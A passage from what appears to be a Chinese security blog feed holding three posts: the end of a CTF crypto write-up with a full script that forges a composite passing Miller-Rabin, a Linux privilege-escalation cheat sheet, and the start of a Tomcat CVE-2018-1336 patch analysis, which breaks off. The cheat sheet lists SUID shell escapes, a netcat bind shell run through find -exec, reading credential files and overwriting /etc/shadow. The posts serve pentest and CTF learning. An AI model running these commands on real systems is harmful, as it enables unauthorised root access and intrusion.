class="line"><span class="string">13 [21, 47]</span></span><br><span class="line"><span class="string">17 [29, 63]</span></span><br><span class="line"><span class="string">19 [29, 39, 47, 55]</span></span><br><span class="line"><span class="string">23 [5, 31, 47, 59, 61]</span></span><br><span class="line"><span class="string">29 [21, 41, 55, 79, 99, 113]</span></span><br><span class="line"><span class="string">31 [17, 19, 37, 39, 63, 95]</span></span><br><span class="line"><span class="string">37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]</span></span><br><span class="line"><span class="string">41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]</span></span><br><span class="line"><span class="string">43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]</span></span><br><span class="line"><span class="string">47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]</span></span><br><span class="line"><span class="string">53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]</span></span><br><span class="line"><span class="string">59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]</span></span><br><span class="line"><span class="string">61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3><span id="pstep3-crt-qiu-p1">Step3 ：CRT求p1</span><a href="#pstep3-crt-qiu-p1" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-09-125951.png" alt="image-20201009205950893"></p><p>最后从每个基的<code>Sb​</code>集合中选择一个，进行<code>CRT</code>求出p1</p><blockquote><p>由于是随机选取，所以CRT未必满足条件，因此要多次random选出能成功CRT的序列</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = - inverse(k3, k2) % k2</span><br><span class="line">p2 = - inverse(k2, k3) % k3</span><br><span class="line">print(p1, p2)</span><br><span class="line">print(isPrime(k2), isPrime(k3))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        crt_A = []</span><br><span class="line">        crt_B = []</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">            crt_A.append(random.choice(Sb[a]))</span><br><span class="line">            crt_B.append(<span class="number">4</span>*a)</span><br><span class="line">        crt_A.append(p1)</span><br><span class="line">        crt_A.append(p2)</span><br><span class="line">        crt_B.append(k2)</span><br><span class="line">        crt_B.append(k3)</span><br><span class="line">        print(crt(crt_A, crt_B))</span><br><span class="line">        print(crt_A)</span><br><span class="line">        print(crt_B)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">p1 = crt(crt_A, crt_B)</span><br></pre></td></tr></table></figure><p>然后求一下<code>p1</code>的模数，根据$p_i = k_i(p_1-1)+1$求出其余的数，稍微调整一下大小到<code>600bits-900bits</code>之间即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> crt_B:</span><br><span class="line">    k = factorize(n)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> k.keys():</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> d.keys()):</span><br><span class="line">            <span class="keyword">if</span>(d[key] &lt; k[key]):</span><br><span class="line">                d[key] = k[key]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d[key] = k[key]</span><br><span class="line">mod_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d.keys():</span><br><span class="line">    mod_number *= pow(key, d[key])</span><br><span class="line">print(<span class="string">'mod:'</span>, mod_number)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span>(_ % <span class="number">10000</span> == <span class="number">0</span>):</span><br><span class="line">        print(_)</span><br><span class="line">    p1 = p1+mod_number*_*pow(<span class="number">2</span>,<span class="number">100</span>)</span><br><span class="line">    p2 = k2*(p1<span class="number">-1</span>)+<span class="number">1</span></span><br><span class="line">    p3 = k3*(p1<span class="number">-1</span>)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(isPrime(p1) <span class="keyword">and</span> isPrime(p2) <span class="keyword">and</span> isPrime(p3)):</span><br><span class="line">        n = p1*p2*p3</span><br><span class="line">        <span class="keyword">if</span>(miller_rabin(n, <span class="number">64</span>)):</span><br><span class="line">            print(p1, p2, p3)</span><br><span class="line">            print(n)</span><br><span class="line">            print(miller_rabin(n, <span class="number">64</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3><span id="pwan-zheng-exp">完整exp</span><a href="#pwan-zheng-exp" class="header-anchor">#</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://eprint.iacr.org/2018/749.pdf</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> libnum.factorize <span class="keyword">import</span> factorize</span><br><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, isPrime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_basis</span><span class="params">(n)</span>:</span></span><br><span class="line">    basis = [<span class="literal">True</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, int(n**<span class="number">0.5</span>)+<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> basis[i]:</span><br><span class="line">            basis[i*i::<span class="number">2</span>*i] = [<span class="literal">False</span>]*((n-i*i<span class="number">-1</span>)//(<span class="number">2</span>*i)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">2</span>] + [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, n, <span class="number">2</span>) <span class="keyword">if</span> basis[i]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">miller_rabin</span><span class="params">(n, b)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Miller Rabin test testing over all</span></span><br><span class="line"><span class="string">    prime basis &lt; b</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    basis = generate_basis(b)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    r, s = <span class="number">0</span>, n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">        s //= <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> basis:</span><br><span class="line">        x = pow(b, s, n)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == n - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            x = pow(x, <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> x == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = generate_basis(<span class="number">64</span>)</span><br><span class="line">print(<span class="string">'A:'</span>, A)</span><br><span class="line">Sa = &#123;&#125;</span><br><span class="line">print(<span class="string">"Sa: "</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">    Sa[a] = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">4</span>*a<span class="number">-1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> libnum.jacobi(a, _) == <span class="number">-1</span>:</span><br><span class="line">            Sa[a].append(_)</span><br><span class="line">    print(a, Sa[a])</span><br><span class="line"></span><br><span class="line">k2 = <span class="number">701</span></span><br><span class="line">k3 = <span class="number">257</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"Sb:"</span>)</span><br><span class="line">Sb = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> Sa[a]:</span><br><span class="line">        <span class="keyword">if</span>((k2*(b<span class="number">-1</span>)+<span class="number">1</span>) % (<span class="number">4</span>*a) <span class="keyword">in</span> Sa[a] <span class="keyword">and</span> (k3*(b<span class="number">-1</span>)+<span class="number">1</span>) % (<span class="number">4</span>*a) <span class="keyword">in</span> Sa[a]):</span><br><span class="line">            result.append(b)</span><br><span class="line">        Sb[a]=result</span><br><span class="line">    print(a,Sb[a])</span><br><span class="line">p1 = - inverse(k3, k2) % k2</span><br><span class="line">p2 = - inverse(k2, k3) % k3</span><br><span class="line">print(p1, p2)</span><br><span class="line">print(isPrime(k2), isPrime(k3))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        crt_A = []</span><br><span class="line">        crt_B = []</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> A:</span><br><span class="line">            crt_A.append(random.choice(Sb[a]))</span><br><span class="line">            crt_B.append(<span class="number">4</span>*a)</span><br><span class="line">        crt_A.append(p1)</span><br><span class="line">        crt_A.append(p2)</span><br><span class="line">        crt_B.append(k2)</span><br><span class="line">        crt_B.append(k3)</span><br><span class="line">        print(crt(crt_A, crt_B))</span><br><span class="line">        print(crt_A)</span><br><span class="line">        print(crt_B)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">p1 = crt(crt_A, crt_B)</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> crt_B:</span><br><span class="line">    k = factorize(n)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> k.keys():</span><br><span class="line">        <span class="keyword">if</span>(key <span class="keyword">in</span> d.keys()):</span><br><span class="line">            <span class="keyword">if</span>(d[key] &lt; k[key]):</span><br><span class="line">                d[key] = k[key]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d[key] = k[key]</span><br><span class="line">mod_number = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d.keys():</span><br><span class="line">    mod_number *= pow(key, d[key])</span><br><span class="line">print(<span class="string">'mod:'</span>, mod_number)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span>(_ % <span class="number">10000</span> == <span class="number">0</span>):</span><br><span class="line">        print(_)</span><br><span class="line">    p1 = p1+mod_number*_*pow(<span class="number">2</span>,<span class="number">100</span>)</span><br><span class="line">    p2 = k2*(p1<span class="number">-1</span>)+<span class="number">1</span></span><br><span class="line">    p3 = k3*(p1<span class="number">-1</span>)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(isPrime(p1) <span class="keyword">and</span> isPrime(p2) <span class="keyword">and</span> isPrime(p3)):</span><br><span class="line">        n = p1*p2*p3</span><br><span class="line">        <span class="keyword">if</span>(miller_rabin(n, <span class="number">64</span>)):</span><br><span class="line">            print(p1, p2, p3)</span><br><span class="line">            print(n)</span><br><span class="line">            print(miller_rabin(n, <span class="number">64</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">A: [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]</span></span><br><span class="line"><span class="string">Sa:</span></span><br><span class="line"><span class="string">2 [3, 5]</span></span><br><span class="line"><span class="string">3 [5, 7]</span></span><br><span class="line"><span class="string">5 [3, 7, 13, 17]</span></span><br><span class="line"><span class="string">7 [5, 11, 13, 15, 17, 23]</span></span><br><span class="line"><span class="string">11 [3, 13, 15, 17, 21, 23, 27, 29, 31, 41]</span></span><br><span class="line"><span class="string">13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]</span></span><br><span class="line"><span class="string">17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]</span></span><br><span class="line"><span class="string">19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]</span></span><br><span class="line"><span class="string">23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]</span></span><br><span class="line"><span class="string">29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]</span></span><br><span class="line"><span class="string">31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]</span></span><br><span class="line"><span class="string">37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]</span></span><br><span class="line"><span class="string">41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]</span></span><br><span class="line"><span class="string">43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]</span></span><br><span class="line"><span class="string">47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]</span></span><br><span class="line"><span class="string">53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]</span></span><br><span class="line"><span class="string">59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]</span></span><br><span class="line"><span class="string">61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]</span></span><br><span class="line"><span class="string">Sb:</span></span><br><span class="line"><span class="string">2 [3, 5]</span></span><br><span class="line"><span class="string">3 [7]</span></span><br><span class="line"><span class="string">5 [7, 17]</span></span><br><span class="line"><span class="string">7 [11, 13, 15]</span></span><br><span class="line"><span class="string">11 [17, 23, 41]</span></span><br><span class="line"><span class="string">13 [21, 47]</span></span><br><span class="line"><span class="string">17 [29, 63]</span></span><br><span class="line"><span class="string">19 [29, 39, 47, 55]</span></span><br><span class="line"><span class="string">23 [5, 31, 47, 59, 61]</span></span><br><span class="line"><span class="string">29 [21, 41, 55, 79, 99, 113]</span></span><br><span class="line"><span class="string">31 [17, 19, 37, 39, 63, 95]</span></span><br><span class="line"><span class="string">37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]</span></span><br><span class="line"><span class="string">41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]</span></span><br><span class="line"><span class="string">43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]</span></span><br><span class="line"><span class="string">47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]</span></span><br><span class="line"><span class="string">53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]</span></span><br><span class="line"><span class="string">59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]</span></span><br><span class="line"><span class="string">61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]</span></span><br><span class="line"><span class="string">30 246</span></span><br><span class="line"><span class="string">1 1</span></span><br><span class="line"><span class="string">61933256682223994457337248907</span></span><br><span class="line"><span class="string">[3, 7, 7, 11, 23, 47, 63, 39, 31, 79, 39, 103, 151, 31, 59, 87, 127, 111, 30, 246]</span></span><br><span class="line"><span class="string">[8, 12, 20, 28, 44, 52, 68, 76, 92, 116, 124, 148, 164, 172, 188, 212, 236, 244, 701, 257]</span></span><br><span class="line"><span class="string">mod: 84521291682266726685731893560</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">434373326067214608775878317645775351280862168574601991542247144587 304495701573117440751890700669688521247884380170795996071115248354787 111633944799274154455400727634964265279181577323672711826357516158603</span></span><br><span class="line"><span class="string">14765242572717201537350357000818561932573315288396435774266341361498670863676541981221739664014401028330587564384701242669740856196369695370339038363927740181650866851457768843113763288312682772243647307</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://eprint.iacr.org/2018/749.pdf" target="_blank" rel="noopener">Prime and Prejudice: Primality Testing Under Adversarial Conditions</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 提权</title>
    <url>/f3ed21e4.html</url>
    <content><![CDATA[<h2><span id="pxin-xi-sou-ji">信息搜集</span><a href="#pxin-xi-sou-ji" class="header-anchor">#</a></h2><a id="more"></a><h3><span id="pji-ben-xin-xi">基本信息</span><a href="#pji-ben-xin-xi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname -a 打印所有可用的系统信息</span><br><span class="line">uname -r 内核版本</span><br><span class="line">uname -n 系统主机名。</span><br><span class="line">uname -m 查看系统内核架构（64位&#x2F;32位）</span><br><span class="line">hostname 系统主机名</span><br><span class="line">cat &#x2F;proc&#x2F;version 内核信息</span><br><span class="line">cat &#x2F;etc&#x2F;*-release 分发信息</span><br><span class="line">cat &#x2F;etc&#x2F;issue 分发信息</span><br><span class="line">cat &#x2F;proc&#x2F;cpuinfo CPU信息</span><br></pre></td></tr></table></figure><h3><span id="pyong-hu-he-qun-zu-quan-xian">用户和群组权限</span><a href="#pyong-hu-he-qun-zu-quan-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd 列出系统上的所有用户</span><br><span class="line">cat &#x2F;etc&#x2F;group 列出系统上的所有组</span><br><span class="line">grep -v -E &quot;^# &quot; &#x2F;etc&#x2F;passwd | awk -F: &#39;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39; 列出所有的超级用户账户</span><br><span class="line">whoami 查看当前用户</span><br><span class="line">w 谁目前已登录，他们正在做什么</span><br><span class="line">last 最后登录用户的列表</span><br><span class="line">lastlog 所有用户上次登录的信息</span><br><span class="line">lastlog –u %username% 有关指定用户上次登录的信息</span><br><span class="line">lastlog |grep -v &quot;Never&quot; 以前登录用户的完</span><br><span class="line">id 当前用户信息</span><br><span class="line">cat &#x2F;etc&#x2F;sudoers 谁被允许以root身份执行</span><br><span class="line">sudo -l 当前用户可以以root身份执行操作</span><br></pre></td></tr></table></figure><h3><span id="phuan-jing-xin-xi">环境信息</span><a href="#phuan-jing-xin-xi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">env 显示环境变量</span><br><span class="line">set 现实环境变量</span><br><span class="line">echo %PATH 路径信息</span><br><span class="line">history 显示当前用户的历史命令记录</span><br><span class="line">pwd 输出工作目录</span><br><span class="line">cat &#x2F;etc&#x2F;profile 显示默认系统变量</span><br><span class="line">cat &#x2F;etc&#x2F;shells 显示可用的shell</span><br></pre></td></tr></table></figure><h2><span id="psuid-ti-quan">SUID提权</span><a href="#psuid-ti-quan" class="header-anchor">#</a></h2><p>以下可执行文件可以进行SUID提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure><p>搜索SUID可执行文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h3><span id="pnmap">nmap</span><a href="#pnmap" class="header-anchor">#</a></h3><p>查看版本，需要版本范围在(2.02-5.21)之间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -V 启动交互模式</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><h3><span id="pvim">Vim</span><a href="#pvim" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim </span><br><span class="line"># Press ESC key</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><h3><span id="pfind">find</span><a href="#pfind" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch pentestlab</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line">find pentestlab -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br><span class="line"></span><br><span class="line">外界连接服务器5555端口即可，反斜杠为转义用</span><br></pre></td></tr></table></figure><h3><span id="pbash">Bash</span><a href="#pbash" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid&#x3D;1002(service) gid&#x3D;1002(service) euid&#x3D;0(root) groups&#x3D;1002(service)</span><br></pre></td></tr></table></figure><h3><span id="pless">Less</span><a href="#pless" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><h3><span id="pcp">cp</span><a href="#pcp" class="header-anchor">#</a></h3><p>使用cp覆盖 /etc/shadow</p><h3><span id="pmv">mv</span><a href="#pmv" class="header-anchor">#</a></h3><p>使用mv 覆盖 /etc/shadow 或者/etc/sudoers</p><h3><span id="pawk">awk</span><a href="#pawk" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><h3><span id="pman">man</span><a href="#pman" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h2><span id="pfu-zhu-ti-quan-gong-ju">辅助提权工具</span><a href="#pfu-zhu-ti-quan-gong-ju" class="header-anchor">#</a></h2><ul><li><p>linux-smart-enumeration</p><ul><li><p><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget &quot;https:&#x2F;&#x2F;github.com&#x2F;diego-treitos&#x2F;linux-smart-enumeration&#x2F;raw&#x2F;master&#x2F;lse.sh&quot; -O lse.sh;chmod 700 lse.sh</span><br></pre></td></tr></table></figure></li></ul></li><li><p>LinEnum</p><ul><li><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;LinEnum.sh -s -k keyword -r report -e &#x2F;tmp&#x2F; -t</span><br></pre></td></tr></table></figure></li></ul></li><li><p>linuxprivchecker</p><ul><li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li></ul></li><li><p>linux-exploit-suggester</p><ul><li><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li></ul></li><li><p>linux-soft-exploit-suggester:</p><ul><li><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a></li></ul></li><li><p>beroot</p><ul><li><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a></li></ul></li><li><p>SUDO_KILLER</p><ul><li><a href="https://github.com/TH3xACE/SUDO_KILLER">https://github.com/TH3xACE/SUDO_KILLER</a></li></ul></li></ul><h2><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h2><ul><li><a href="https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAA">https://mp.weixin.qq.com/s/23bQ9nhavXGOvOknEc-BAA</a></li><li><a href="https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg">https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-1336和CVE-2018-8034</title>
    <url>/9dc656c7.html</url>
    <content><![CDATA[<h2><span id="pcve-2018-1336">CVE-2018-1336</span><a href="#pcve-2018-1336" class="header-anchor">#</a></h2><blockquote><p>An improper handing of overflow in the UTF-8 decoder with supplementary characters can lead to an infinite loop in the decoder causing a Denial of Service. Versions Affected: Apache Tomcat 9.0.0.M9 to 9.0.7, 8.5.0 to 8.5.30, 8.0.0.RC1 to 8.0.51, and 7.0.28 to 7.0.86.</p></blockquote><a id="more"></a><h3><span id="plou-dong-yuan-li">漏洞原理</span><a href="#plou-dong-yuan-li" class="header-anchor">#</a></h3><p>从补丁中可以看到问题出在函数<code>decodeHasArray</code>中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">--- a/java/org/apache/tomcat/util/buf/Utf8Decoder.java</span><br><span class="line">+++ b/java/org/apache/tomcat/util/buf/Utf8Decoder.java</span><br><span class="line">@@ -<span class="number">278</span>,<span class="number">6</span> +<span class="number">278</span>,<span class="number">11</span> @@ <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utf8Decoder</span> <span class="keyword">extends</span> <span class="title">CharsetDecoder</span> </span>&#123;</span><br><span class="line">                 outRemaining--;</span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                 <span class="keyword">if</span> (outRemaining &lt; <span class="number">2</span>) &#123;</span><br><span class="line">+                    <span class="comment">// Encoded with 4 bytes. inIndex currently points</span></span><br><span class="line">+                    <span class="comment">// to the final byte. Move it back to first byte.</span></span><br><span class="line">+                    inIndex -= <span class="number">3</span>;</span><br><span class="line">+                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">+                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                     <span class="keyword">return</span> CoderResult.OVERFLOW;</span><br><span class="line">                 &#125;</span><br><span class="line">                 cArr[outIndex++] = (<span class="keyword">char</span>) ((jchar &gt;&gt; <span class="number">0xA</span>) + <span 